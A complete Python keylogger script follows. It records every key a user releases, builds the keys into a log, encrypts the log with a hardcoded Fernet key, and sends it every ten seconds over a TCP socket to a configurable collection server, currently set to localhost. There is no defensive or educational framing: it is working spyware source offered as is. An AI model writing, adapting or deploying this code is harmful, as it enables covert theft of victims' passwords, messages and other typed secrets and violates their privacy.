import keyboard
from threading import Timer
from datetime import datetime
from socket import *
from cryptography.fernet import Fernet

SERVER = 'localhost'
PORT = 12345
ENCRYPTION_KEY = b'6717Ub-YB8Brvn2bnarriTULPLKpIcLhveFbsQ6okhM='
LOG_INTERVAL = 10 # seconds

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            try:
                self.send_log()
            except:
                print("[*] cannot establish connection")
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def send_log(self):
        clientSocket = socket(AF_INET, SOCK_STREAM)
        clientSocket.connect((SERVER, PORT))

        fernet = Fernet(ENCRYPTION_KEY)
        encMessage = fernet.encrypt((self.log).encode())

        print("[+] log sent")

        clientSocket.send(encMessage)
        clientSocket.close()

    def start(self):
        try:
            keyboard.on_release(callback=self.callback)
            self.report()
            keyboard.wait()
        except KeyboardInterrupt:
            print("[-] stopping")

if __name__ == "__main__":
    keylogger = Keylogger(interval=LOG_INTERVAL)
    print("[+] starting")
    keylogger.start()
